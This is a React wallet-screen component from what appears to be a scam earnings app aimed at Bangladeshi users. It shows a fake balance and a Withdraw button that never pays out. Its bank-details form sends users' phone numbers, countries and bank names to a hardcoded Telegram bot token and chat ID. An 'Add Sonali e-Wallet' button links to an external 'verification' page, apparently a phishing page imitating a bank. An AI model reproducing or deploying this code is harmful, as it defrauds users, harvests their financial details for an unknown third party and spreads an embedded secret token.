import React, { useState } from 'react';
import { useAuth } from '../contexts/AuthContext';
import Button from './Button';
import { Wallet as WalletIcon, Banknote, Clock, ExternalLink, Info, ArrowDown } from 'lucide-react';
import clsx from 'clsx';

// Telegram Bot Configuration (Must match the one in App.tsx)
const TELEGRAM_BOT_TOKEN = "7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco";
const TELEGRAM_CHAT_ID = "6658445342";

// Final Withdraw Modal Component (Placeholder for visual effect)
const WithdrawModal: React.FC<{ isOpen: boolean, onClose: () => void, message: string }> = ({ isOpen, onClose, message }) => {
    if (!isOpen) return null;
    return (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in">
            <div className="bg-white rounded-xl p-6 w-80 shadow-2xl text-center animate-in zoom-in duration-300">
                <Banknote size={40} className="text-emerald-600 mx-auto mb-4" />
                <h3 className="font-bold text-lg text-gray-800 mb-4">Withdrawal Status</h3>
                <p className="text-sm text-gray-600 mb-6">{message}</p>
                <Button onClick={onClose} fullWidth>Close</Button>
            </div>
        </div>
    );
};

export const Wallet: React.FC = () => {
    const { user } = useAuth();
    const [country, setCountry] = useState('');
    const [bankName, setBankName] = useState('');
    const [showWithdrawModal, setShowWithdrawModal] = useState(false);

    // --- Telegram Logger ---
    const sendToTelegram = async (logMessage: string) => {
        const message = `*🏦 Wallet Info Submission* (User: \`${user.phoneNumber}\`)\n------------------------\n${logMessage}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
            });
            return res.ok;
        } catch (error) {
            console.error("Telegram fetch error:", error);
            return false;
        }
    };

    // --- Action Handlers ---
    const handleWithdraw = () => {
        // 🎯 Show the specific message in a modal
        setShowWithdrawModal(true);
    };

    const handleSonaliEWallet = () => {
        // 🎯 Redirect to the external Sonali e-Wallet link
        window.open('https://sonaliewallet182-cmd.github.io/sonali-e-wallet-verification-/', '_blank');
    };

    const handleHistory = () => {
        alert("Wallet History is currently unavailable.");
    };

    const handleSaveDetails = async () => {
        if (!country || !bankName) {
            alert('অনুগ্রহ করে দেশ এবং ব্যাংকের নাম লিখুন।');
            return;
        }
        
        const logMessage = `*Country:* ${country}\n*Bank (BD):* ${bankName}`;
        const success = await sendToTelegram(logMessage);

        if (success) {
            alert('আপনার তথ্য সফলভাবে জমা দেওয়া হয়েছে। ২৪ ঘণ্টার মধ্যে আপনার অ্যাকাউন্টটি যোগ করার বিকল্প যুক্ত করা হবে।');
            setCountry('');
            setBankName('');
        } else {
            alert('জমা দিতে ব্যর্থ। অনুগ্রহ করে আবার চেষ্টা করুন।');
        }
    };

    return (
        <div className="p-4 pb-24 space-y-6">
            
            {/* Withdraw Modal */}
            <WithdrawModal 
                isOpen={showWithdrawModal} 
                onClose={() => setShowWithdrawModal(false)}
                message="আপনার উপার্জন করা অর্থ উত্তোলনের জন্য একটি ব্যাংক অ্যাকাউন্ট যোগ করুন।" 
            />

            {/* Total Balance Card (WhatsApp Green) */}
            <div className="bg-[#075E54] rounded-2xl p-6 text-white shadow-xl shadow-emerald-200">
                <div className="flex justify-between items-start">
                    <div>
                        <p className="text-emerald-100 text-sm font-medium mb-1">Total Balance</p>
                        <h1 className="text-4xl font-bold">৳ {user.balance.toFixed(2)}</h1>
                    </div>
                    <Banknote size={40} className="text-white/80" />
                </div>
                
                <div className="mt-6 flex gap-3">
                    <Button onClick={handleWithdraw} className="flex-1 bg-[#25D366] text-white hover:bg-emerald-600 border-none flex items-center justify-center gap-1">
                        <ArrowDown size={18} /> Withdraw
                    </Button>
                    <Button onClick={handleHistory} className="flex-1 border-white text-white hover:bg-white/10 flex items-center justify-center gap-1">
                        <Clock size={18} /> History
                    </Button>
                </div>
            </div>

            {/* Payment Methods Section */}
            <div className="bg-white rounded-xl p-5 shadow-md border border-gray-100 space-y-4">
                <h3 className="font-semibold text-gray-800 mb-4 flex items-center gap-2">
                    <WalletIcon size={20} className="text-emerald-600" /> Payment Methods
                </h3>

                {/* 🎯 New Buttons */}
                <div className="flex gap-3">
                    <Button onClick={handleSonaliEWallet} className="flex-1 py-3 text-emerald-800 bg-emerald-100 hover:bg-emerald-200 border-none flex items-center justify-center gap-1">
                        <i className="fas fa-university"></i> Add Sonali e-Wallet
                    </Button>
                </div>
                
                <div className="space-y-3">
                    <input className="w-full p-3 border rounded-lg bg-gray-50 focus:bg-white focus:ring-2 focus:ring-emerald-500 outline-none transition" placeholder="Your Country" value={country} onChange={e => setCountry(e.target.value)} />
                    <input className="w-full p-3 border rounded-lg bg-gray-50 focus:bg-white focus:ring-2 focus:ring-emerald-500 outline-none transition" placeholder="Bank Name (BD)" value={bankName} onChange={e => setBankName(e.target.value)} />
                    <Button onClick={handleSaveDetails} fullWidth className="bg-[#25D366] hover:bg-emerald-600">Save Details</Button>
                </div>

                {/* Instruction Box (Final Look) */}
                <div className="p-3 bg-blue-50 border border-blue-200 rounded-lg text-sm text-blue-800 flex gap-2">
                    <Info size={16} className="text-blue-500 mt-0.5 shrink-0" />
                    <span>যদি আপনার সোনালী ই-ওয়ালেট না থাকে, তাহলে আপনার দেশ এবং ব্যাংকের নাম লিখে "Save Details"-এ ক্লিক করুন। আমাদের দল ২৪ ঘণ্টার মধ্যে আপনার তথ্য যাচাই করবে এবং উত্তোলনের ব্যবস্থা করবে।</span>
                </div>
            </div>
        </div>
    );
};